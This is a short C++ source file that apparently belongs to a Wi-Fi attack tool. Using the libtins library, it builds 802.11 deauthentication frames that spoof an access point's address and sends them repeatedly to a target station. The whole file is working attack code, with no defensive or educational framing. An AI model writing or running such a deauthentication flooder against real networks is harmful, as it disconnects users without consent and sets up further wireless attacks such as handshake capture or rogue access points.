#include "sendpacket.h"

SendPacket::SendPacket()
{

}

void SendPacket::sendDeauth(std::string BSSID, std::string STA_ADDR, std::string interface_name, int count)
{
    Tins::Dot11::address_type ap = BSSID;
    Tins::Dot11::address_type sta = STA_ADDR;

    Tins::RadioTap radio = Tins::RadioTap();

    Tins::Dot11Deauthentication deauth = Tins::Dot11Deauthentication();

    deauth.addr1(sta);   // destination
    deauth.addr2(ap);   // source
    deauth.addr3(ap);   // bssid

    radio.inner_pdu(deauth);

    Tins::PacketSender sender;
    for (int i = 1; i <= count; i++)
    {
      sender.send(radio, interface_name.c_str());
      usleep(10000);
    }

}
